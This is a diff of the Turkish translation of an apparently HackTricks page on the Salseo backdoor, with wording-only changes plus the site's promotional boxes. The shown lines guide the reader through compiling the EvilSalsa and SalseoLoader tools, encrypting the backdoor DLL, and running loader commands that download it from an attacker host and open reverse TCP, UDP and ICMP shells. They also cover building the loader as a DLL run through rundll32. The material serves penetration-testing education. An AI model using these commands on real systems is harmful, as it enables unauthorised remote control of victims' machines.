@@ -6,11 +6,11 @@
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklam görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* **💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
@@ -18,21 +18,21 @@ HackTricks'ı desteklemenin diğer yolları:
 
 Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
 
-Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, bu mimari için derleyin).
+Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64 destekliyorsa, o mimari için derleyin).
 
-Mimariyi Visual Studio içinde **sol "Build" sekmesindeki "Platform Target" bölümünden seçebilirsiniz.**
+Mimariyi Visual Studio içinde **sol "Build" sekmesindeki** **"Platform Target"** bölümünden **seçebilirsiniz.**
 
-(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
+(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Ardından, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
+Sonra, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
 ## Arka Kapıyı Hazırlama
 
-İlk olarak, **EvilSalsa.dll**'yi kodlamalısınız. Bunu yapmak için **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+İlk olarak, **EvilSalsa.dll**'yi şifrelemeniz gerekecek. Bunun için, **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
@@ -60,13 +60,13 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 ### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**
 
-Ters kabuk dinleyicisi olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
+Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **ICMP ters kabuk almak (kurbanın içinde zaten kodlanmış dll bulunmaktadır)**
+### **ICMP ters kabuk almak (kodlanmış dll zaten kurbanın içinde)**
 
-**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız olacak. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **ICMP Yanıtlarını Devre Dışı Bırakın:**
 ```
@@ -83,19 +83,19 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## SalseoLoader'ı ana işlevi dışa aktaran DLL olarak derleme
+## Ana işlevi dışa aktaran DLL olarak SalseoLoader'ı derleme
 
 Visual Studio kullanarak SalseoLoader projesini açın.
 
 ### Ana işlevden önce ekle: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Bu projeye DllExport yükleyin
 
 #### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**
 
@@ -109,13 +109,13 @@ Projelerinizin klasöründe **DllExport.bat** ve **DllExport\_Configure.bat** do
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın
+### Visual Studio'yu kapatın ve DllExport\_Configure'ı çalıştırın
 
-Sadece **Visual Studio'yu kapatın**
+Sadece Visual Studio'yu **kapatın**
 
 Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın
 
-**x64**'ü seçin (eğer x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin
+**x64**'ü seçin (eğer bir x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı (DllExport için **Namespace**) seçin ve **Uygula**'yı seçin
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -135,11 +135,11 @@ Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
+Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolunu göreceksiniz)
 
 ### Oluşturulan Dll'yi test edin
 
-Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.
+Dll'yi test etmek istediğiniz yere kopyalayın.
 
 Çalıştır:
 ```
@@ -173,14 +173,14 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>Sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **bizi** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
 
 </details>
